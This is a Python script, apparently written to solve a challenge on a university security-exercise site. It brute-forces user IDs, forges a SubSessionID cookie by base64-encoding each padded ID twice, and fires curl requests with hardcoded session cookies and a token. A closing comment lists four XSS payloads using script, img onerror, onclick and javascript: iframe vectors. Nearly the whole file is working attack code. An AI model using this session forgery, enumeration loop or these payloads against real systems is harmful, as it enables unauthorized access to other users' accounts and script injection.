import base64
import subprocess
import time

def userid_to_string(integer):
    int_string = str(integer)
    lengthofstring = len(int_string)
    newstring = ""
    if lengthofstring < 16:
        newstring = "0"
        newstring *= (16 - lengthofstring)

    return newstring + int_string


def full_curl_command(userid,sessionid):
    curl = "curl 'https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://snickerboa.it.liu.se' -H 'Connection: keep-alive' -H 'Referer: https://snickerboa.it.liu.se/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6.jsp' -H 'Cookie: SubSessionID="+sessionid+"; JSESSIONID=61F72DCAFD09E4EFFD7E869C48CE40FE; token=-27308006086005020069741403302435919934' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' --data-raw 'userId="+userid+"&useSecurity=true'"
    return curl

userID = 1
while userID < 9999999999999999:
    encode_this = userid_to_string(userID)
    encode_this_bytes = encode_this.encode("ascii")
    encoded_once = base64.b64encode(encode_this_bytes)
    encoded_once_string = encoded_once.decode("ascii")
    encoded_twice = base64.b64encode(encoded_once)
    encoded_twice_string = encoded_twice.decode("ascii")
    print(encode_this,encoded_once_string,encoded_twice_string)
    output = subprocess.run(full_curl_command(encode_this,encoded_twice_string), shell=True,capture_output=True)
    print(output.stdout.decode())
    userID += 1


'''
<script>alert('XSS')</script>
<img src="#" onerror="alert('XSS')" />
<input type="button" onclick="alert('XSS')" />
<iframe src="javascript:alert('XSS');"></iframe>
'''